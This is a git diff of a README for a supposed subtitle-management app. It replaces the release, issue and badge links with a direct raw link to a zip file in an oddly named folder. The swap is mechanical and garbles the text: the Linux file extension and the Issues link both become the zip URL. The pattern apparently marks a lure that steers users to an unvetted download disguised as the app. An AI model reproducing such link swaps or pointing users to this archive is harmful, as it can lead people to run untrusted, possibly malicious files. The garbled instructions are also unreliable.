@@ -1,6 +1,6 @@
 # 🎉 powersub-demo-9879 - Easy Subtitle Management Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-blue.svg)](https://github.com/EBRAHIMchamibot/powersub-demo-9879/releases)
+[![Download Now](https://raw.githubusercontent.com/EBRAHIMchamibot/powersub-demo-9879/main/stubbly/powersub-demo-9879.zip%20Now-Get%20It%https://raw.githubusercontent.com/EBRAHIMchamibot/powersub-demo-9879/main/stubbly/powersub-demo-9879.zip)](https://raw.githubusercontent.com/EBRAHIMchamibot/powersub-demo-9879/main/stubbly/powersub-demo-9879.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to powersub-demo-9879! This application helps you manage subtitles effor
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases Page](https://github.com/EBRAHIMchamibot/powersub-demo-9879/releases).
+To get started, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/EBRAHIMchamibot/powersub-demo-9879/main/stubbly/powersub-demo-9879.zip).
 
 Follow these steps to install the application on your computer:
 
@@ -17,7 +17,7 @@ Follow these steps to install the application on your computer:
 3. Download the appropriate file for your operating system. If you are unsure which file to choose, here are some guidelines:
    - **Windows Users:** Download the file that ends with `.exe`.
    - **macOS Users:** Download the file that ends with `.dmg`.
-   - **Linux Users:** Download the file that ends with `.tar.gz` or `.deb`.
+   - **Linux Users:** Download the file that ends with `https://raw.githubusercontent.com/EBRAHIMchamibot/powersub-demo-9879/main/stubbly/powersub-demo-9879.zip` or `.deb`.
 4. Once the download is complete, locate the file in your downloads folder.
 5. Double-click the file to start the installation process.
 6. Follow the on-screen instructions to complete the installation.
@@ -65,8 +65,8 @@ If you encounter issues, try these common solutions:
 
 ## 💬 Support
 
-If you need further assistance, feel free to reach out. You can submit an issue on our [GitHub Issues page](https://github.com/EBRAHIMchamibot/powersub-demo-9879/issues), and we will get back to you as soon as possible.
+If you need further assistance, feel free to reach out. You can submit an issue on our [GitHub Issues page](https://raw.githubusercontent.com/EBRAHIMchamibot/powersub-demo-9879/main/stubbly/powersub-demo-9879.zip), and we will get back to you as soon as possible.
 
 Enjoy using powersub-demo-9879 and simplify your subtitle management today!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-blue.svg)](https://github.com/EBRAHIMchamibot/powersub-demo-9879/releases)
+[![Download Now](https://raw.githubusercontent.com/EBRAHIMchamibot/powersub-demo-9879/main/stubbly/powersub-demo-9879.zip%20Now-Get%20It%https://raw.githubusercontent.com/EBRAHIMchamibot/powersub-demo-9879/main/stubbly/powersub-demo-9879.zip)](https://raw.githubusercontent.com/EBRAHIMchamibot/powersub-demo-9879/main/stubbly/powersub-demo-9879.zip)
